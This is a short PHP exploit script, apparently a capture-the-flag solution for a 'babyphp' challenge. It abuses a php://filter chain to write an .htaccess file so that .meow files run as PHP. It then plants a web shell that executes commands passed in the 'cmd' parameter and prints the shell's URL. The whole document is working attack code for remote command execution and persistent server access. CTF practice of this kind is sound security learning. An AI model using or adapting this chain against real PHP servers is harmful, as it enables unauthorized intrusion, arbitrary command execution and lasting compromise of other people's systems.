<?php

// There should be various solutions to this challenge.

$BASE_URL = 'https://babyphp.h4ck3r.quest';

if (date('i')[1] === '8') die("Don't run this exploit at 10*n+8 minutes lol");

function b64e($s)
{
    return trim(base64_encode($s), "=");
}

function gen_exploit($content)
{
    $payload = '0' . b64e($content);
    $payload = 'x' . b64e($payload);
    return $payload;
}

$php_filter_chain = 'php://filter/string.strip_tags|convert.iconv.utf-8.utf-7|convert.base64-decode|string.strip_tags|convert.quoted-printable-decode|convert.base64-decode/resource';
$sesssion_id = bin2hex(random_bytes(16));

$htaccess  = gen_exploit('AddType application/x-httpd-php .meow');

file_get_contents(
    "$BASE_URL/?code=$htaccess&output=$php_filter_chain=.htaccess",
    0,
    stream_context_create(['http' => ['header' => "Cookie: PHPSESSID=$sesssion_id"]])
);

$webshell  = gen_exploit('<pre><?php system($_GET["cmd"]); ?>');

$res = file_get_contents(
    "$BASE_URL/?code=$webshell&output=$php_filter_chain=shell.meow",
    0,
    stream_context_create(['http' => ['header' => "Cookie: PHPSESSID=$sesssion_id"]])
);

// echo $res;
echo "Webshell: $BASE_URL/sandbox/" . md5('1'.$sesssion_id) . "/shell.meow?cmd=ls+/\n";
